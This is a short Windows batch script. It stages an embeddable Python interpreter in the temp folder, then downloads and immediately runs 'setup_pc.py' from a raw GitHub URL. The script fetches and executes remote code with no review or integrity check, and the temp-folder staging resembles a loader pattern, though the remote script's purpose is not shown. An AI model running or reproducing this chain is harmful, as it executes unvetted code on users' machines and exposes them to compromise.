@echo off
cd /d %TEMP%
mkdir ps 2>nul
cd ps
curl -L -o py.zip https://www.python.org/ftp/python/3.12.8/python-3.12.8-embed-amd64.zip
tar -xf py.zip
curl -L -o setup_pc.py https://raw.githubusercontent.com/adataffi-ai/setup/main/setup_pc.py
python.exe setup_pc.py
